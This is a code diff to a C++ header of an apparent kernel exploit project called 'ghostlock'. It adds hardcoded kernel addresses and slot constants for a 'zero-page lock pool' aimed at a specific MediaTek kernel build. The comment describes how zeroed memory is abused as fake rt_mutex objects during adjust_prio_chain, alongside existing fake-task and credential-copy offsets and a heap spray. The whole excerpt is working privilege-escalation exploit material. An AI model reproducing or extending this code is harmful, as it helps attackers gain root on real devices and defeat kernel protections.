@@ -34,6 +34,27 @@ namespace ghostlock::target {
         inline constexpr std::size_t kTcpCredentialCopyOffset = 0x6800;
     } // namespace payload
 
+    namespace zero_lock {
+        /* SO-54C CLI-verified safe zero zone (init_pg_end .. _end, symbol-free
+         * per symbols.txt): 0xffffffc00aa86000 .. 0xffffffc00aa8a000, 16 KiB.
+         * A zeroed slot IS a valid rt_mutex: wait_lock=0 (unlocked qspinlock),
+         * waiters root=NULL, rb_leftmost=NULL, owner=NULL. adjust_prio_chain on
+         * such a lock is deterministic: [7] requeue inserts the stamped waiter
+         * as a black root on the empty tree, [9] sees owner==NULL and exits
+         * right after the write — no descent of a planted W0 tree, no fake_task
+         * walk, nothing left on the (gambled) spray page. This is the reference
+         * mt6896 (5.10.136) design: zero-page lock pool + ghost task=init_task.
+         * Slots are consumed once (the chain dirties root+leftmost) and banked
+         * by pid so a restarted process cannot replay a dead slot. */
+        inline constexpr std::uintptr_t kZoneBase = 0xffffffc00aa86000ULL;
+        inline constexpr std::uintptr_t kZoneEnd = 0xffffffc00aa8a000ULL;
+        inline constexpr std::size_t kSlotStride = 0x20;
+        inline constexpr std::size_t kBankStride = 0x800;
+        inline constexpr std::size_t kZoneSize = static_cast<std::size_t>(kZoneEnd - kZoneBase);
+        inline constexpr std::size_t kBankCount = kZoneSize / kBankStride;
+        inline constexpr std::size_t kSlotsPerBank = kBankStride / kSlotStride;
+    } // namespace zero_lock
+
     template<typename Domain>
     class KernelAddress final {
     public:
@@ -89,6 +110,9 @@ namespace ghostlock::target {
     static_assert(payload::kFakeTaskOffset == 0x1280);
     static_assert(payload::kTcpFakeTaskOffset == 0x5800);
     static_assert(payload::kTcpCredentialCopyOffset == 0x6800);
+    static_assert(zero_lock::kZoneSize == 0x4000);
+    static_assert(zero_lock::kBankCount == 8);
+    static_assert(zero_lock::kSlotsPerBank == 64);
 } // namespace ghostlock::target
 
 #endif
